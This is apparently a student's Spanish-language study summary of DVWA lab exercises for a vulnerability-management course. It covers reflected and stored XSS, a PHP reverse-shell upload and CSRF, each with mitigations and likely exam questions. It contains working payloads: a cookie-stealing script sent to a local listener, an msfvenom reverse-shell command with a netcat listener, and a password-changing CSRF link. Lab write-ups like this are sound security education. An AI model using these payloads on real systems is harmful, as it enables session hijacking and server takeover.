# Resumen para Sustentar — INFORME #1 GVA

**Asignatura:** Gestión de Vulnerabilidades en Aplicaciones
**Plataforma:** DVWA (Damn Vulnerable Web Application) — Nivel Low

---

## Contexto general

DVWA es una aplicación web intencionalmente vulnerable usada para practicar ataques controlados. Se trabajaron 4 vulnerabilidades: XSS Reflejado, XSS Almacenado, Upload Backdoor y CSRF.

---

## Vulnerabilidad 1 — XSS Reflejado

### ¿Qué es?
El servidor recibe un parámetro con código JavaScript del atacante y lo devuelve en la respuesta HTML sin sanitizar. El navegador de la víctima lo ejecuta creyendo que viene del servidor legítimo.

### ¿Qué se hizo exactamente?

1. Abrir servidor HTTP en Kali como receptor de cookies:
   ```
   python3 -m http.server 8888
   ```
2. Inyectar payload en el campo vulnerable de DVWA:
   ```
   <script>new Image().src="http://127.0.0.1:8888/?c="+document.cookie;</script>
   ```
3. El navegador ejecutó el script y envió la cookie al listener. Se recibió:
   ```
   PHPSESSID=18ff22346f0f579ba5604b1bc150c45f
   ```
4. Con F12 → Application → Cookies, se reemplazó el PHPSESSID propio por el robado → sesión iniciada como la víctima sin contraseña.

### ¿Por qué funciona?
DVWA nivel Low no aplica ningún filtro sobre el parámetro `name`. Lo refleja directamente en el HTML de respuesta.

### Mitigación
- Validar inputs con lista blanca del lado del servidor.
- Sanitizar salida con `htmlspecialchars()` en PHP o `DOMPurify` en JS — convierten `<` en `&lt;` para que el navegador no lo ejecute como código.

---

## Vulnerabilidad 2 — XSS Almacenado

### ¿Qué es?
El payload se guarda en la base de datos. Cada vez que cualquier usuario carga la página, el script se ejecuta automáticamente. Es más grave que el reflejado porque afecta a **todos los usuarios** sin que hagan clic en un enlace.

### ¿Qué se hizo exactamente?

1. El campo "Message" tenía `maxlength="50"` en el HTML — insuficiente para el payload.
2. Con F12 → Inspector, se cambió `maxlength` de `50` a `100` directamente en el HTML.
3. Se inyectó el payload:
   ```
   <script>window.location.href="https://google.com";</script>
   ```
4. A partir de ese momento cualquier usuario que abre la página de XSS Stored es redirigido a Google.
5. Para restaurar, se entró a MariaDB y se ejecutó:
   ```sql
   sudo mysql -u root -p
   USE dvwa;
   UPDATE guestbook SET comment = REPLACE(comment, '<script>', '') WHERE comment LIKE '%<script>%';
   ```

### Punto clave
El `maxlength` es solo una restricción del **cliente** (HTML), nunca del servidor. El servidor debe validar también en backend.

### Mitigación
- `strip_tags()` y `htmlspecialchars()` antes de insertar en BD.
- `htmlentities()` al extraer datos para mostrarlos.
- Validación de longitud en el servidor, no solo en el HTML.

---

## Vulnerabilidad 3 — Upload Backdoor

### ¿Qué es?
El servidor permite subir cualquier archivo sin verificar si es realmente una imagen. Un atacante sube un `.php` malicioso y el servidor lo ejecuta cuando se accede por URL.

### ¿Qué se hizo exactamente?

1. Se creó `danielaguirre.php` con una webshell simple.
2. Se generó una reverse shell con msfvenom:
   ```
   msfvenom -p php/reverse_php LHOST=127.0.0.1 LPORT=4444 -f raw > danielaguirre.php
   ```
3. Se abrió un listener con Netcat:
   ```
   nc -lvnp 4444
   ```
4. Se subió el archivo por el formulario de DVWA.
5. Al acceder a `http://127.0.0.1/dvwa/hackable/uploads/danielaguirre.php` el servidor ejecutó el PHP y abrió una conexión de vuelta al listener → shell del servidor obtenida.

### Punto clave
DVWA nivel Low no verifica la extensión ni el contenido del archivo. En producción esto equivale a acceso total al servidor.

### Mitigación
- Lista blanca de extensiones: solo `.jpg`, `.png`, `.gif`.
- Renombrar archivos con nombre aleatorio al guardarlos.

---

## Vulnerabilidad 4 — CSRF

### ¿Qué es?
El navegador envía automáticamente las cookies de sesión con cada petición HTTP. Un atacante construye una página maliciosa que realiza una petición al sitio vulnerable **en nombre de la víctima autenticada**, sin que ella lo sepa.

### Diferencia clave con XSS

| | XSS | CSRF |
|---|---|---|
| ¿Dónde está el ataque? | Dentro del sitio víctima | En una página externa |
| ¿Qué aprovecha? | Falta de sanitización de salida | Cookies automáticas del navegador |
| ¿Quién ejecuta el código? | El navegador de la víctima | El servidor víctima |

### ¿Por qué es vulnerable DVWA?
El cambio de contraseña usa método **GET** — los parámetros viajan en la URL. Cualquiera puede construir un enlace como:
```
http://dvwa/vulnerabilities/csrf/?password_new=hacked&password_conf=hacked&Change=Change
```
Si la víctima hace clic mientras está autenticada, su contraseña cambia sin confirmación.

### Mitigación
- **Token CSRF:** valor secreto único por sesión incluido en cada formulario — el servidor lo verifica.
- Usar método POST para acciones sensibles.
- Verificar cabecera `Referer` u `Origin`.

---

## Reflexión — Puntos clave para mencionar

- Las 4 vulnerabilidades tienen la **misma causa raíz**: confiar en el input del usuario sin validarlo.
- XSS Almacenado es más crítico que Reflejado por persistencia y escala.
- Upload Backdoor fue el ataque de mayor impacto: en minutos se obtuvo ejecución remota de comandos.
- La seguridad debe integrarse desde el inicio del desarrollo (**Secure by Design**), no como parche posterior.
- Todos los ataques se realizaron sin privilegios especiales, solo con el navegador y herramientas básicas.

---

## Posibles preguntas del docente

| Pregunta | Respuesta clave |
|---|---|
| ¿Diferencia entre XSS Reflejado y Almacenado? | El Reflejado se ejecuta una vez para una víctima específica. El Almacenado queda en la BD y afecta a todos los usuarios. |
| ¿Por qué usaste `python3 -m http.server`? | Para capturar la cookie que el script XSS envía — actúa como servidor receptor. |
| ¿Qué es PHPSESSID? | El identificador de sesión de PHP. Con él el servidor identifica al usuario sin contraseña. |
| ¿Por qué cambiaste maxlength en F12? | Era una restricción solo del lado del cliente (HTML). El servidor no validaba la longitud. |
| ¿Qué hace msfvenom? | Genera payloads maliciosos. Aquí generó un PHP que al ejecutarse abre una conexión reversa al atacante. |
| ¿Qué es una reverse shell? | El servidor víctima se conecta al atacante, no al revés, para evadir firewalls que bloquean conexiones entrantes. |
| ¿Por qué CSRF con GET es un problema? | Las peticiones GET son reproducibles con un simple enlace. No requieren formulario ni acción activa del usuario. |
| ¿Qué es DVWA? | Damn Vulnerable Web Application — plataforma de práctica con vulnerabilidades web intencionalmente expuestas. |
| ¿Qué es un PHPSESSID robado? | Una cookie de sesión válida. Con ella se puede suplantar al usuario sin conocer su contraseña. |
| ¿Qué diferencia hay entre sanitizar entrada vs salida? | Sanitizar entrada filtra antes de guardar. Sanitizar salida codifica antes de mostrar. Lo ideal es hacer ambas. |